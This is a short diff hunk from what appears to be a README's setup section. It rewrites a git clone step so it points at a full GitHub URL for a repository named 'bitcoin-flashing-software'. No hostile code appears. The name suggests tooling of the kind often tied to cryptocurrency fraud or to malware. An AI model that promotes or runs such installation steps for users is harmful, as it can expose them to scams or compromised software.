@@ -52,7 +52,7 @@ brew install node
 1. Clone the repository:
 
 ```sh
-git clone bitcoin-flashing-software/public-release && cd public-release
+git clone https://github.com/bitcoin-flashing-software/public-release && cd public-release
 ```
 
 2. Install necessary dependencies:
